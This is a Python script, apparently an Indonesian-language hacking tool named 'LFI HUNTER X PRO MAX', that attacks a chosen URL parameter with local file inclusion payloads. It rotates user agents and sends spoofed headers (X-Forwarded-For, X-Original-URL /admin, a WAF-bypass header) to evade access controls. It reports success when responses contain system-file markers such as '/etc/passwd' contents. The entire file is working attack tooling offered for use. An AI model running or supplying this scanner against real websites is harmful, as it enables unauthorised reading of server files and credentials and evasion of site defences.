import requests
import time
import sys
import os
from urllib.parse import quote,urlparse,parse_qs
from termcolor import cprint,colored
from tqdm import tqdm
def load_user_agents(file='user.txt'):
	if not os.path.exists(file):cprint(f"[!] File {file} tidak ditemukan!",'red');sys.exit()
	with open(file,'r')as f:return[line.strip()for line in f if line.strip()]
def load_payloads(file='payload.txt'):
	if not os.path.exists(file):cprint(f"[!] File {file} tidak ditemukan!",'red');sys.exit()
	with open(file,'r')as f:return[line.strip()for line in f if line.strip()]
def build_headers(user_agent):return{'User-Agent':user_agent,'X-Forwarded-For':'127.0.0.1','Referer':'https://google.com/','X-Original-URL':'/admin','X-Custom-IP-Authorization':'127.0.0.1','Accept':'*/*','Connection':'close'}
def detect_success(text):indicators=['root:x:0:','PATH=','[fonts]','GNU','Linux','bin/bash'];return any(i.lower()in text.lower()for i in indicators)
def extract_params(url):parsed=urlparse(url);qs=parse_qs(parsed.query);return list(qs.keys())
def scan(url,param,user_agents,payloads):
	total=len(payloads)*len(user_agents);cprint(f"\n[•] Total kombinasi scan: {total}",'cyan');time.sleep(1)
	for ua in user_agents:
		headers=build_headers(ua)
		for payload in tqdm(payloads,desc=f"[{ua[:20]}...]",colour='green'):
			encoded=quote(payload);target=url.replace(f"{param}=",f"{param}={encoded}")
			try:
				r=requests.get(target,headers=headers,timeout=10);status=r.status_code
				if status==403:headers['X-Bypass-WAF']='true';r=requests.get(target,headers=headers,timeout=10);status=r.status_code
				if status==200 and detect_success(r.text):cprint(f"\n[✓] SUCCESS: {target}",'green');cprint(r.text[:300],'white');return
				time.sleep(.3)
			except Exception as e:cprint(f"[x] Error: {e}",'red')
	cprint('\n[-] Scan selesai. Tidak ada payload yang berhasil.','yellow')
if __name__=='__main__':
	os.system('clear');cprint('╔═════════════════════════════════════════════╗','blue');cprint('║        LFI HUNTER X PRO MAX 🔥             ║','blue');cprint('║        by RenXploit Cyber Division         ║','blue');cprint('╚═════════════════════════════════════════════╝\n','blue');url=input(colored('[?] Masukkan URL target: ','cyan'))
	if'='not in url:cprint('[!] URL tidak valid. Gunakan format: ?page=xxx','red');sys.exit()
	param=input(colored('[?] Masukkan nama parameter (kosongkan untuk auto): ','cyan')).strip()
	if not param:
		cprint('[•] Auto mendeteksi parameter dari URL...','cyan');params=extract_params(url)
		if not params:cprint('[!] Gagal deteksi parameter.','red');sys.exit()
		param=params[0];cprint(f"[✓] Menggunakan parameter: {param}",'green')
	ua_list=load_user_agents();payload_list=load_payloads();scan(url,param,ua_list,payload_list)
